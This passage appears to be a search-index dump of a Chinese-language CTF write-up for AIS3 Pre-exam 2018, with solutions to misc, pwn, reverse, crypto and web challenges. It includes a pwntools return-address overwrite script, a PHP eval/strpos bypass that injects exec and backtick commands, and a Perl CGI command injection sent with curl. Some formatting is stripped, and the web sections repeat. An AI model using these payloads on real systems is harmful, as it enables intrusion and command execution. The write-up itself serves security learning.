\npreg_match\n(\n/name=\n\\\ns\n\\\n\\svalue=\n\\\n.+/\n,\n$output\n,\n$sm\n);\n\n    \npreg_match\n(\n/value=\n\\\n.+/\n,\n$sm\n[\n0\n],\n$sm\n);\n\n    \npreg_match\n(\n/\n\\\n.+/\n,\n$sm\n[\n0\n],\n$sm\n);\n\n    \npreg_match\n(\n/[0-9a-z]+/\n,\n$sm\n[\n0\n],\n$sm\n);\n\n    \npreg_match\n(\n/Flag.+/\n,\n$output\n,\n$flag\n);\n\n    \n//var_dump($cm);\n\n    \n//var_dump($sm);\n\n    \n$cm\n \n=\n \n$cm\n[\n0\n];\n\n    \n$sm\n \n=\n \n$sm\n[\n0\n];\n\n    \n$flag\n \n=\n \n$flag\n[\n0\n];\n\n    \necho\n \n$cm\n.\n\\n\n.\n$sm\n.\n\\n\n.\n$flag\n.\n\\n\\n\n;\n\n    \nif\n(\n!\nstrpos\n(\n$flag\n,\nNOT_A_VALID_FLAG\n)){\n\n        \nbreak\n;\n\n    \n}\n\n    \n$c\n \n=\n \n$cm\n;\n\n    \n$s\n \n=\n \n$sm\n;\n\n\n}\n\n\ncurl_close\n(\n$ch\n);\n\n\n\n\n\n\n\u525b\u958b\u59cb\u6c92\u767c\u73feflag\uff0c\u8dd1\u52304\u842c\u591as\u8b8a\u6210N/A\uff0c\u5f8c\u4f86\u624d\u767c\u73fe\uff0c\u65bc\u662f\u53c8\u91cd\u8dd1\uff0c\u6700\u5f8c\u572817332\u7684\u5730\u65b9\u51fa\u73feflag\n\u51fa\u984c\u8005\u771f\u662f\u6709\u5920\u58de\n\n\nWeb3\n\n\nSushi\n\n\n?php\n\n\n// PHP is the best language for hacker\n\n\n// Find the flag !!\n\n\nhighlight_file\n(\n__FILE__\n);\n\n\n$_\n \n=\n \n$_GET\n[\n??\n];\n\n\n\nif\n(\n \nstrpos\n(\n$_\n,\n \n)\n \n||\n \nstrpos\n(\n$_\n,\n \n)\n \n)\n \n    \ndie\n(\nBad Hacker :(\n);\n\n\n\neval\n(\ndie(\n \n.\n \nsubstr\n(\n$_\n,\n \n0\n,\n \n16\n)\n \n.\n \n);\n);\n\n\n\n\n\n\n\u96a8\u4fbf\u4e82\u8a66\u5f8c\u767c\u73fe\n\"\n\u6216\n'\n\u53ea\u8981\u5728\u6574\u500b\u5b57\u4e32\u7684\u7b2c\u4e00\u500b\u51fa\u73fe\u904e\uff0c\u5f8c\u9762\u518d\u51fa\u73fe\uff0c\u5c31\u4e0d\u6703\u88ab\u64cb\u6389\uff0c\u539f\u56e0\u662f\nstrpos\n\u662f\u627e\u51fa\u8a72\u5b57\u4e32\u7b2c\u4e00\u6b21\u51fa\u73fe\u7684\u4f4d\u7f6e\uff0c\u800c\u9019\u9ebc\u505a\u7b2c\u4e00\u6b21\u51fa\u73fe\u7684\u4f4d\u7f6e\u4fbf\u6703\u662f0\uff0c\u7136\u5f8c\nif\n\u9019\u6a23\u5beb\u5c31\u6703\u7576\u6210\nfalse\n\n\u65bc\u662f\u5c31\u5148\u751f\u51fa\u9019\u6a23:\n\".exec(\"ls\").\"\n\uff0c\u7136\u5f8c\u767c\u73fe\nphpinfo.php\n\uff0c\u60f3\u8aaa\u6703\u5728\u5176\u4ed6\u76ee\u9304\uff0c\u4f46\u662f\u60f3\u8981\u627e\u5176\u4ed6\u76ee\u9304\u6307\u4ee4\u6703\u592a\u9577\uff0c\u6240\u4ee5\u53c8\u60f3\u4e86\u4e00\u4e0b\uff0c\u53ef\u4ee5\u628a\nexec\n\u63db\u6210\u5169\u500b\u53cd\u5f15\u865f\uff0c\u8b8a\u6210\n\".\u2035ls\u2035.\"\n\uff0c\u7136\u5f8c\u5c31\u8dd1\u51fa\u5176\u4ed6\u6a94\u6848\uff0c\u88e1\u9762\u5c31\u6709flag\uff0c\u6a94\u6848\u662f\nflag_name_1s_t00_l0ng_QAQQQQQQ\n\uff0c\u6a94\u540d\u592a\u9577\uff0c\u4e0d\u80fd\u7528cat\uff0c\u90a3\u5c31\u76f4\u63a5\u628a\u6a94\u540d\u52a0\u5728\u7db2\u5740\u5f8c\u5c31\u80fd\u770b\u4e86\n\nexec\n\u53ea\u770b\u5230\nphpinfo.php\n\u7684\u539f\u56e0\u662f\nexec\n\u9810\u8a2d\u53ea\u6703\u7d66\u51fa\u6700\u5f8c\u4e00\u884c\u7684\u8f38\u51fa\n\n\nWeb4\n\n\nperljam\n\u53c8\u662f\u85cf\u4e86.git\n\u7528Githack\u6293\u4e0b\u4f86\uff0c\u767c\u73fe\u4e00\u4efd\u6a94\u6848\nindex-b44be173b965d6bdc0b784b6797fac0a.cgi.bak\n\n\n#!/usr/bin/perl\n\n\n# My uploader!\n\n\nuse strict;\n\n\nuse warnings;\n\n\nuse CGI;\n\n\nmy $cgi = CGI-\nnew;\n\n\nprint $cgi-\nheader();\n\n\nprint \nbody style=\\\nbackground: #caccf7 url(\nhttps://i.imgur.com/Syv2IVk.png\n);padding: 30px;\\\n;\n\n\nprint \np style=\ncolor:red\nNo BUG Q_____Q\n/p\n;\n\n\nprint \nbr\n;\n\n\nprint \npre\n;\n\n\nif( $cgi-\nupload(\nfile\n) ) {\n\n\n        my $file = $cgi-\nparam(\nfile\n);\n\n\n        while(\n$file\n) {\n\n\n                print \n$_\n;\n\n\n        }\n\n\n}\n\n\nprint \n/pre\n;\n\n\n\n\n\n\n\u4e0a\u7db2\u627e\u4e00\u627e\uff0c\u767c\u73fe\u4e86\nhttps://github.com/isislab/CSAW-CTF-2016-Quals/tree/master/Web/I%20Got%20Id\n\u628apayload\u6539\u4e00\u4e0b\n\n\necho \"asdf\" | curl -F \"file=ARGV\" -F \"file=@-\" \"http://104.19135:31334/cgi-bin/index.cgi?ls /|\"\n\n\u627e\u5230\nreadflag\n\n\necho \"asdf\" | curl -F \"file=ARGV\" -F \"file=@-\" \"http://104.19135:31334/cgi-bin/index.cgi?/readflag|\"\n\n\u57f7\u884c\nreadflag\n\uff0cflag\u5c31\u5674\u51fa\u4f86\u4e86", 
            "title": "Pre-exam"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#ais3-pre-exam-2018", 
            "text": "\u51fa\u984c\u8005\u597d\u58deww", 
            "title": "AIS3 Pre-exam 2018"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#misc1", 
            "text": "\u9001\u5206\u984c\uff0c\u76f4\u63a5\u7d66flag", 
            "title": "Misc1"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#misc2", 
            "text": "\u4e00\u5f35jpg\uff0c\u88e1\u97623\u500b\u5047flag\n\u901a\u5e38\u9019\u7a2e\u984c\u76ee\u6211\u90fd\u6703\u5148\u7528binwalk\u770b\u770b\uff0c\u7d50\u679c\u767c\u73fe\u6709zip\uff0c\u60f3\u8aaa\u628a\u5b83\u62ff\u51fa\u4f86\u89e3\u58d3\u7e2e\uff0c\u7d50\u679c\u8981\u5bc6\u78bc\uff0c\u672c\u4f86\u60f3\u8aaa\u662f\u507d\u52a0\u5bc6\uff0c\u628abinary\u6539\u4e00\u4e0b\u61c9\u8a72\u5c31\u597d\u4e86\uff0c\u7d50\u679c\u6539\u4e86\u9084\u662f\u6253\u4e0d\u958b\uff0c\u5c31\u5148\u653e\u4e00\u908a\n\u5f8c\u4f86\u7d66\u4e86\u63d0\u793a\uff0c\u8aaa\u770b\u770b\u5716\u7247\u88e1\u5047flag\u7684\u4e0b\u9762\uff0c\u4ed4\u7d30\u4e00\u770b\uff0c\u7adf\u7136\u662f\u6469\u65af\u5bc6\u78bc...... .- .. ... ...-- -.-- --- ..- ..-. .. -. -.. - ..... . .-. . .- .-.. ..-. .-.. .- --. --- .... -.-- . .- .... \n\u56e0\u70ba\u756b\u8cea\u4e0d\u592a\u597d\uff0c\u6709\u4e9b\u53ef\u80fd\u6709\u770b\u932f\uff0c\u7a0d\u5fae\u8166\u88dc\u4e00\u4e0b\nFlag: AIS3{YOUFINDTHEREALFLAGOHYEAH}", 
            "title": "Misc2"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#misc3", 
            "text": "MP3stego \u76f4\u63a5\u7528\u5c31\u6709\u4e86", 
            "title": "Misc3"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#pwn1", 
            "text": "\u6709\u4e00\u500bfunction\u6703\u8f38\u51faflag\n\u53ef\u4ee5\u8f38\u5165\u5169\u500b\u5b57\u4e32\uff0c\u662f\u7528gets\uff0c\u591a\u7684\u6771\u897f\u5c31\u76f4\u63a5\u5f9estack\u84cb\u904e\u53bb\u4e86\uff0c\u6240\u4ee5\u5c31\u628amain\u7684return address\u84cb\u6210\u8f38\u51faflag\u7684function\u5c31\u884c\u4e86\nexplotion:  from   pwn   import   *  r   =   remote ( 104.199.235.135 , 2111 )  addr   =   0x400797  payload   =   a * 840 + p64 ( addr )  print   r . recvuntil ( : )  r . sendline ( a )  print   r . recvuntil ( : )  print   payload  r . sendline ( payload )  r . interactive ()", 
            "title": "Pwn1"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#reverse1", 
            "text": "\u76f4\u63a5ctrl+F\uff0c\u627e AIS3{ \uff0c\u5c31\u6703\u627e\u5230\uff0c\u4f46\u662f\u6709\u4e00\u5806\u5047\u7684", 
            "title": "Reverse1"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#reverse2", 
            "text": "\u76f4\u63a5\u7528IDA pro decompile\uff0c\u770b\u5230\u9019\u6a23\u7684\u6771\u897f:  void   init ()  { \n   signed   int   i ;   // [sp+Ch] [bp-4h]@1 \n\n   srand ( 0 ); \n   for   (   i   =   0 ;   i   =   84 ;   ++ i   ) \n   { \n     secret [ i ]   +=   5 ; \n     secret [ i ]   =   1 ; \n     secret [ i ]   -=   10 ; \n     secret [ i ]   =   2 ; \n   }  }  //----- (0000000000000930) ----------------------------------------------------  int   __cdecl   main ( int   argc ,   const   char   ** argv ,   const   char   ** envp )  { \n   int   result ;   // eax@10 \n   __int64   v4 ;   // rsi@10 \n   int   v5 ;   // [sp+4h] [bp-1Ch]@7 \n   int   i ;   // [sp+8h] [bp-18h]@3 \n   int   v7 ;   // [sp+Ch] [bp-14h]@7 \n   FILE   * stream ;   // [sp+10h] [bp-10h]@1 \n   __int64   v9 ;   // [sp+18h] [bp-8h]@1 \n\n   v9   =   * MK_FP ( __FS__ ,   40LL ); \n   stream   =   fopen ( /tmp/secret ,   w ); \n   init (); \n   puts ( ========== WELCOME TO MY MIND ========== ); \n   puts ( Try to find out secret in my mind!!! ); \n   while   (   cnt   !=   85   ) \n   { \n     __isoc99_scanf ( %d ,   v5 ); \n     v7   =   rand ()   %   2018 ; \n     if   (   v7   !=   v5   ) \n     { \n       puts ( Get out!!! You don t know me. ); \n       goto   LABEL_10 ; \n     } \n     secret [ cnt ]   ^=   v5 ; \n     puts ( Nice try! Next one. ); \n     ++ cnt ; \n   } \n   for   (   i   =   0 ;   i   =   84 ;   ++ i   ) \n     fputc (( unsigned   __int8 ) secret [ i ],   stream ); \n   puts ( You know the flag~~~ );  LABEL_10 : \n   result   =   0 ; \n   v4   =   * MK_FP ( __FS__ ,   40LL )   ^   v9 ; \n   return   result ;  }   \u95dc\u9375\u5728srand(0)\uff0c\u9019\u4ee3\u8868\u4e0d\u662f\u96a8\u6a5f\uff0c\u6240\u4ee5\u5c31\u5beb\u4e00\u500b\u4e00\u6a23\u7684\u5c31\u597d  #include bits/stdc++.h  using   namespace   std ;  int   main (){ \n     srand ( 0 ); \n     for ( int   i = 0 ; i = 84 ; i ++ ){ \n         cout rand () % 2018 endl ; \n     } \n     return   0 ;  }   \u76f4\u63a5 $ ./exploit | ./secret", 
            "title": "Reverse2"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#crypto1", 
            "text": "POW\nproof of work  ==================== proof of work ====================\nplease give me an x satisfying the following condition\ncondition : x[:6] ==  0H1O4K  and hashlib.sha256(x).hexdigest()[:6] ==  000000 \nx =  \u524d\u7db4\u6bcf\u6b21\u90fd\u4e0d\u540c\n\u5c31\u771f\u7684\u662fproof of work\uff0c\u76f4\u63a5\u786c\u5e79  import   hashlib  import   random  from   pwn   import   *  r   =   remote ( 104.199.235.135 , 20000 )  dic   =   0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ  suffix   =   5KAJTC  #suffix = raw_input();  prefix   =   28KVRZ9JZ1  r . recvline ()  r . recvline ()  text   =   r . recvline ()  suffix   =   ( text [ 22 :])[: 6 ]  #condition : x[:6] ==  GZLXFZ  and hashlib.sha256(x).hexdigest()[:6] ==  000000  print   suffix  r . recvuntil ( =  )  s   =   suffix + prefix  hash   =   hashlib . sha256 ( s ) . hexdigest ()[: 6 ]  ok   =   False  for   a   in   range ( 0 , 36 ): \n     if   ok : \n         break ; \n     for   b   in   range ( 0 , 36 ): \n         if   ok : \n             break ; \n         for   c   in   range ( 0 , 36 ): \n             if   ok : \n                 break ; \n             for   d   in   range ( 0 , 36 ): \n                 if   ok : \n                     break ; \n                 for   e   in   range ( 0 , 36 ): \n                     prefix   =   dic [ a ] + dic [ b ] + dic [ c ] + dic [ d ] + dic [ e ] \n                     s   =   suffix + prefix \n                     hash   =   hashlib . sha256 ( s ) . hexdigest ()[: 6 ] \n                     #print hash \n                     if   hash   == 000000 : \n                         print   s \n                         ok   =   True ; \n                         break ;  r . sendline ( s )  r . interactive ()", 
            "title": "Crypto1"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#crypto2", 
            "text": "XOR\n\u9019\u597d\u50cf\u662f\u6211\u7b2c\u4e00\u6b21\u9019\u9ebc\u8a8d\u771f\u89e3crypto\u5427\uff0c\u4ee5\u524d\u5927\u6982\u90fd\u76f4\u63a5\u8df3\u904e\n\u984c\u76ee\u7d66\u4e86\u5169\u500b\u6a94\u6848\uff0c\u52a0\u5bc6\u5f8c\u7684\u6771\u897f\u8ddf\u52a0\u5bc6\u7a0b\u5f0f\nencrypt:  #!/usr/bin/env python3  import   os  import   random  with   open ( flag ,   rb )   as   data : \n     flag   =   data . read () \n     assert ( flag . startswith ( b AIS3{ ))  def   extend ( key ,   L ): \n     kL   =   len ( key ) \n     return   key   *   ( L   //   kL )   +   key [: L   %   kL ]  def   xor ( X ,   Y ): \n     return   bytes ([ x   ^   y   for   x ,   y   in   zip ( X ,   Y )])  key   =   os . urandom ( random . randint ( 8 ,   12 ))  plain   =   flag   +   key  key   =   extend ( key ,   len ( plain ))  cipher   =   xor ( plain ,   key )  with   open ( flag-encrypted ,   wb )   as   data : \n     data . write ( cipher )   \u89c0\u5bdf\u5f8c\u6703\u767c\u73fe\uff0c\u5b83\u7684\u52a0\u5bc6\u65b9\u5f0f\u662f\u5148\u96a8\u6a5f\u7522\u4e00\u500bkey\uff0c\u9577\u5ea6\u662f8~12\u96a8\u6a5f\u9078\uff0c\u7136\u5f8c\u6703\u628aflag\u8ddfkey\u653e\u5728\u4e00\u8d77\u7576\u6210\u88ab\u52a0\u5bc6\u7684\u539f\u6587\uff0c\u7136\u5f8c\u52a0\u5bc6\u7684key\u5247\u662f\u900f\u904e\u91cd\u8907\u63a5\u597d\u5e7e\u6b21\u4f86\u8b8a\u6210\u8ddf\u539f\u6587\u4e00\u6a23\u9577\uff0c\u7136\u5f8c\u505axor\u5f97\u5230\u5bc6\u6587\n\u601d\u8003\u4e86\u4e00\u4e0b\uff0c\u6211\u5011\u6709\u4e00\u9ede\u5df2\u77e5\u7684\u660e\u6587: AIS3{ \uff0c\u800c\u9019\u4e32\u660e\u6587\u4e5f\u4f4d\u65bc\u6574\u500b\u5bc6\u6587\u7684\u958b\u982d\uff0c\u56e0\u6b64\u6211\u5011\u53ef\u4ee5\u5c07\u5bc6\u6587\u7684\u524d5\u500bbyte\u8ddf\u9019\u4e32\u660e\u6587\u505axor\uff0c\u9019\u6a23\u5c31\u80fd\u5f97\u5230key\u7684\u524d5\u500bbyte: 16 09 7c c7 dd \n\u63a5\u8457\u5f97\u60f3\u8fa6\u6cd5\u77e5\u9053key\u5be6\u969b\u5230\u5e95\u591a\u9577\uff0c\u6211\u5011\u5df2\u7d93\u77e5\u9053\u52a0\u5bc6\u7684key\u662f\u7531\u539f\u672c\u7684key\u91cd\u8907\u5f88\u591a\u6b21\u4e32\u8d77\u4f86\u7684\uff0c\u4e5f\u5c31\u662f\u8aaa\u5728\u4e2d\u9593\u9084\u6709\u5f88\u591a\u6bb5\u662f\u4e00\u6a23\u7528\u9019\u4e94\u500bbyte\u4f86\u52a0\u5bc6\u7684\uff0c\u800c\u5982\u679c\u662fflag\uff0c\u5c31\u7b97\u53ea\u6709\u4e94\u500b\u5b57\u5143\u61c9\u8a72\u4e5f\u662f\u80fd\u5920\u5206\u8fa8\u51fa\u4f86\uff0c\u6240\u4ee5\u5c31\u5beb\u4e00\u500bscript\uff0c\u628a\u5bc6\u6587\u5f9e\u982d\u5230\u5c3e\u90fd\u8a66\u8a66\u770b  import   os  import   random  with   open ( 5key ,   rb )   as   data : \n     key5   =   data . read ()  with   open ( flag-encrypted ,   rb )   as   data : \n     flag   =   data . read ()  def   extend ( key ,   L ): \n     kL   =   len ( key ) \n     return   key   *   ( L   //   kL )   +   key [: L   %   kL ]  def   xor ( X ,   Y ): \n     return   bytes ([ x   ^   y   for   x ,   y   in   zip ( X ,   Y )])  for   i   in   range ( 0 , len ( flag ) - 5 ): \n     plain   =   flag [ i : i + 5 + 1 ] \n     cipher   =   xor ( key5 , plain ) \n     print ( %d  :  %s   %   ( i , cipher ))   \u8dd1\u51fa\u4f86\u7684\u7d50\u679c(\u4e2d\u9593\u7701\u7565\u4e00\u4e9b\u4e0d\u662fflag\u7684\u6771\u897f):  0   :   b AIS3{  1   :   b V \\x88a\\xf1  2   :   b 9\\xfd\\xda\\xeb\\x92  3   :   b \\xe2\\xafP\\x88?  4   :   b \\xb0%3%\\x0e  5   :   b :F\\x9e\\x14c  10   :   b In aM  20   :   b  - Wh  30   :   b R Hap  40   :   b t0mOR  50   :   b OU mU  60   :   b 0Mis3  70   :   b n3 tH  80   :   b TH4T   90   :   b iLL s  100   :   b ho Y0  110   :   b . Not  120   :   b Rfect  130   :   b IER,   140   :   b  gOOD  150   :   b }\\x16\\t|\\xc7  155   :   b \\x84h\\xc0\\xf2\\x85   \u9019\u6a23\u6211\u5011\u5c31\u80fd\u7b97\u51fakey\u7684\u9577\u5ea6\u662f10\uff0c\u56e0\u70ba\u5169\u6b21\u6b63\u78ba\u89e3\u5bc6\u4e4b\u9593\u5dee\u4e8610\u500bbyte\n\u63a5\u8457\u6211\u5011\u9084\u80fd\u767c\u73feflag\u7684\u9577\u5ea6\u662f151\uff0c\u6700\u5f8c\u505c\u5728150\u7684\u4f4d\u7f6e\uff0c\u56e0\u70ba\u9019\u6a23\u7684\u504f\u79fb\uff0c\u4f7f\u6211\u5011\u80fd\u5920\u7b97\u51fa\u5b8c\u6574flag\uff0c\u4e0b\u9762\u7528\u4e00\u5f35\u8868\u4f86\u8aaa\u660e\n\u9019\u5f35\u8868\u4f7f\u7528kn\u4f86\u4ee3\u8868key\u7684\u7b2cn\u500bbyte     \u539f\u6587  }  k1  k2  k3  k4  k5  k6      \u52a0\u5bc6\u7528\u7684key  k1  k2  k3  k4  k5  k6  k7    \u5bc6\u6587  }^k1  k1^k2  k2^k3  k3^k4  k4^k5  k5^k6  k6^k7     \u5148\u770b\u539f\u6587\u70bak5\u7684\u90a3\u500bbyte\uff0c\u5c07\u90a3\u500bbyte\u7684\u5bc6\u6587\u8ddfk5\u505axor\uff0c\u5c31\u80fd\u5f97\u5230k6\n\u6709\u4e86k6\uff0c\u5c31\u53ef\u4ee5\u5728\u5f80\u4e0b\u4e00\u500bbyte\u7b97\u51fak7\uff0c\u5982\u6b64\u4e0b\u53bb\uff0c\u5c31\u80fd\u7b97\u51fa\u5b8c\u6574\u7684key\u4e86\uff0c\u6709\u4e86\u5b8c\u6574\u7684key\uff0c\u5c31\u80fd\u89e3\u51fa\u539f\u6587  \u627e\u51fakey\u7684code:  import   os  import   random  with   open ( 5key ,   rb )   as   data : \n     key5   =   data . read ()  with   open ( flag-encrypted ,   rb )   as   data : \n     flag   =   data . read ()  def   extend ( key ,   L ): \n     kL   =   len ( key ) \n     return   key   *   ( L   //   kL )   +   key [: L   %   kL ]  def   xor ( X ,   Y ): \n     return   bytes ([ x   ^   y   for   x ,   y   in   zip ( X ,   Y )])  key   =   key5  with   open ( key ,   +wb )   as   data : \n     data . write ( key ) \n     for   i   in   range ( 155 , 160 ): \n         tk   =   bytes ([ key [ 4 + i - 155 ] ^ flag [ i ]]) \n         data . write ( tk ) \n         key   =   key + tk   \u89e3\u5bc6\u7684code:  import   os  import   random  with   open ( key ,   rb )   as   data : \n     key   =   data . read ()  with   open ( flag-encrypted ,   rb )   as   data : \n     flag   =   data . read ()  def   extend ( key ,   L ): \n     kL   =   len ( key ) \n     return   key   *   ( L   //   kL )   +   key [: L   %   kL ]  def   xor ( X ,   Y ): \n     return   bytes ([ x   ^   y   for   x ,   y   in   zip ( X ,   Y )])  plain   =   flag  key   =   extend ( key ,   len ( plain ))  cipher   =   xor ( plain ,   key )  print ( cipher )  with   open ( flag ,   wb )   as   data : \n     data . write ( cipher )   Flag:  AIS3{captAIn aMeric4 - Wh4T3V3R HapPenS t0mORr0w YOU mUst PR0Mis3 ME on3 tHIng. TH4T yOu WiLL stAY Who Y0U 4RE. Not A pERfect sO1dIER, buT 4 gOOD MAn.} \n\u8d85\u7d1a\u9577", 
            "title": "Crypto2"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#web1", 
            "text": "http://104.199.235.135:31331/index.php?p=7\n\u9032\u53bb\u6703\u770b\u5230 Did you see the flag \n\u539f\u672c\u4ee5\u70ba\u8ddf\u53bb\u5e74\u4e00\u6a23\u662fhttp 302\uff0c\u7d50\u679c\u4e0d\u662f\n\u5f8c\u4f86\u767c\u73feheader\u6709 Partial-Flag \uff0c\u7136\u5f8c\u6539\u4e86\u4e00\u4e0b\u53c3\u6578\uff0c\u767c\u73fe\u6709\u4e0d\u540c\u7684\u5b57\uff0c\u5beb\u500bscript\u6293\u4e00\u6293\u5c31\u51fa\u4f86\u4e86  ?php  for ( $p = 1 ; $p = 2050 ; $p ++ ){ \n     $result   =   get_headers ( http://104.199.235.135:31331/index.php?p= $p ,   1 ); \n     echo   $p ; \n     echo   $result [ Partial-Flag ]; \n     echo   \\n ;  }", 
            "title": "Web1"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#web2", 
            "text": "\u9032\u53bb\u5f8c\u986f\u793a There is a secret page in the website. Can you find it? \n\u99ac\u4e0a\u60f3\u5230robots.txt\n\u6253\u958b\u5f8c\u767c\u73fe  User-agent: *\nDisallow: /admin\nDisallow: /cgi-bin/\nDisallow: /images/\nDisallow: /tmp/\nDisallow: /private/\nDisallow: /_hidden_flag_.php  \u770b\u4f86\u662f\u5728_hidden_flag_.php\uff0c\u9032\u53bb\u5f8c\u986f\u793a Hmm ... no flag here! \uff0c\u7136\u5f8c\u6709\u500b\u5012\u6578\uff0c\u5012\u6578\u5b8c\u6703\u8df3\u51fa\u4e00\u500b\u6309\u9215 Get flag in the next page. \uff0c\u9ede\u4e0b\u53bb\u5c31\u662f\u4e00\u6a23\u7684\u52d5\u4f5c\uff0c\u4f46\u662f\u5f9e\u539f\u59cb\u78bc\u6703\u767c\u73fe\u9019\u6a23\u7684\u6771\u897f  html  head  meta   charset = utf-8 /  script   type = text/javascript   src = _hidden_flag_.js / script  / head  body \nHmm ... no flag here! form   method = post  input   type = hidden   name = c   value = 1 /  input   type = hidden   name = s   value = 3241b876891b9ea67db897e940db6ea9e7e351447546b8da82bbf3693dfe9ebb /  span   id = disp / span  / form  / body   html  head  meta   charset = utf-8 /  script   type = text/javascript   src = _hidden_flag_.js / script  / head  body \nHmm ... no flag here! form   method = post  input   type = hidden   name = c   value = 2 /  input   type = hidden   name = s   value = 6d16a8d466b16f456bf9a3faeef31db59612cbb11ce64e0196b07d25ed2cff4e /  span   id = disp / span  / form  / body   __hidden_flag_.js  var   _0x13ed = [ getElementById , disp , setInterval , onload , clearInterval , innerHTML , input\\x20type=\\x22submit\\x22\\x20value=\\x22Get\\x20flag\\x20in\\x20the\\x20next\\x20page.\\x22/ ];( function ( _0x4ff87b , _0x35e2bc ){ var   _0x2c01be = function ( _0x216360 ){ while ( -- _0x216360 ){ _0x4ff87b [ push ]( _0x4ff87b [ shift ]());}}; _0x2c01be ( ++ _0x35e2bc );}( _0x13ed , 0x13f )); var   _0x5d44 = function ( _0x592680 , _0x1e9b97 ){ _0x592680 = _0x592680 - 0x0 ; var   _0x50206c = _0x13ed [ _0x592680 ]; return   _0x50206c ;}; var   left = 0x0 ; var   timer = null ; var   disp = null ; function   countdown (){ left = left - 0x1 ; if ( timer != null left == 0x0 ){ window [ _0x5d44 ( 0x0 )]( timer ); timer = null ; disp [ _0x5d44 ( 0x1 )] = _0x5d44 ( 0x2 );} else { disp [ _0x5d44 ( 0x1 )] = ( + left + ) ;}} function   setup (){ disp = document [ _0x5d44 ( 0x3 )]( _0x5d44 ( 0x4 )); left = 0xa + parseInt ( Math [ random ]() * 0xa ); timer = window [ _0x5d44 ( 0x5 )]( countdown , 0x3e8 ); disp [ _0x5d44 ( 0x1 )] = ( + left + ) ;} window [ _0x5d44 ( 0x6 )] = setup ;   \u7136\u5f8c\u5c31\u6703\u767c\u73fepost\u904e\u53bb1\uff0c\u6703\u7d662\uff0cpost\u904e\u53bb2\uff0c\u6703\u7d663\uff0c\u8ddfjavascript\u6839\u672c\u6c92\u95dc\u4fc2\n\u7136\u5f8c\u5728\u4ed4\u7d30\u89c0\u5bdf\u4e00\u4e0bheader\uff0c\u6703\u767c\u73fe\u6709\u4e00\u500b Flag: AIS3{NOT_A_VALID_FLAG} \uff0c\u5f88\u986f\u7136\u662f\u932f\u7684\uff0c\u90a3\u5c31\u61c9\u8a72\u662f\u591a\u8dd1\u5e7e\u6b21\uff0c\u5c31\u6703\u51fa\u73fe\u5c0d\u7684\u3002\n\u90a3\u5c31\u5beb\u4e00\u500bscript  ?php  $url   =   104.199.235.135:31332/_hidden_flag_.php ;  $ch   =   curl_init ();  curl_setopt ( $ch ,   CURLOPT_URL ,   $url );  curl_setopt ( $ch   ,   CURLOPT_HEADER ,   true );  curl_setopt ( $ch ,   CURLOPT_POST ,   true );  curl_setopt ( $ch ,   CURLOPT_RETURNTRANSFER ,   true );  //$c =  46828 ;  //$s =  4818d80ac35251a43047417fe68ac4c94aab3586adc8d0b41063f796ecbef122 ;  $c   =   5521 ;  $s   =   56483453de40c26df92cc87deb70b173c405483f2571e8a24d2d48e48f0f0dc4 ;  while ( 1 ){ \n     curl_setopt ( $ch ,   CURLOPT_POSTFIELDS ,   http_build_query ( array ( c = $c ,   s = $s )));  \n     $output   =   curl_exec ( $ch ); \n     //str_replace(array( \\r\\n , \\t ,    , \\n ), ,$output); \n     //echo $output; \n     preg_match ( /name= \\ c \\ \\svalue= \\ .+/ , $output , $cm ); \n     preg_match ( /[0-9]+/ , $cm [ 0 ], $cm ); \n     preg_match ( /name= \\ s \\ \\svalue= \\ .+/ , $output , $sm ); \n     preg_match ( /value= \\ .+/ , $sm [ 0 ], $sm ); \n     preg_match ( / \\ .+/ , $sm [ 0 ], $sm ); \n     preg_match ( /[0-9a-z]+/ , $sm [ 0 ], $sm ); \n     preg_match ( /Flag.+/ , $output , $flag ); \n     //var_dump($cm); \n     //var_dump($sm); \n     $cm   =   $cm [ 0 ]; \n     $sm   =   $sm [ 0 ]; \n     $flag   =   $flag [ 0 ]; \n     echo   $cm . \\n . $sm . \\n . $flag . \\n\\n ; \n     if ( ! strpos ( $flag , NOT_A_VALID_FLAG )){ \n         break ; \n     } \n     $c   =   $cm ; \n     $s   =   $sm ;  }  curl_close ( $ch );   \u525b\u958b\u59cb\u6c92\u767c\u73feflag\uff0c\u8dd1\u52304\u842c\u591as\u8b8a\u6210N/A\uff0c\u5f8c\u4f86\u624d\u767c\u73fe\uff0c\u65bc\u662f\u53c8\u91cd\u8dd1\uff0c\u6700\u5f8c\u572817332\u7684\u5730\u65b9\u51fa\u73feflag\n\u51fa\u984c\u8005\u771f\u662f\u6709\u5920\u58de", 
            "title": "Web2"
        }, 
        {
            "location": "/CTFWriteUp/2018/AIS3/pre-exam/#web3", 
            "text": "Sushi  ?php  // PHP is the best language for hacker  // Find the flag !!  highlight_file ( __FILE__ );  $_   =   $_GET [ ?? ];  if (   strpos ( $_ ,   )   ||   strpos ( $_ ,   )   )  \n     die ( Bad Hacker :( );  eval ( die(   .   substr ( $_ ,   0 ,   16 )   .   ); );   \u96a8\u4fbf\u4e82\u8a66\u5f8c\u767c\u73fe \" \u6216 ' \u53ea\u8981\u5728\u6574\u500b\u5b57\u4e32\u7684\u7b2c\u4e00\u500b\u51fa\u73fe\u904e\uff0c\u5f8c\u9762\u518d\u51fa\u73fe\uff0c\u5c31\u4e0d\u6703\u88ab\u64cb\u6389\uff0c\u539f\u56e0\u662f strpos \u662f\u627e\u51fa\u8a72\u5b57\u4e32\u7b2c\u4e00\u6b21\u51fa\u73fe\u7684\u4f4d\u7f6e\uff0c\u800c\u9019\u9ebc\u505a\u7b2c\u4e00\u6b21\u51fa\u73fe\u7684\u4f4d\u7f6e\u4fbf\u6703\u662f0\uff0c\u7136\u5f8c if \u9019\u6a23\u5beb\u5c31\u6703\u7576\u6210 false \n\u65bc\u662f\u5c31\u5148\u751f\u51fa\u9019\u6a23: \".exec(\"ls\").\" \uff0c\u7136\u5f8c\u767c\u73fe 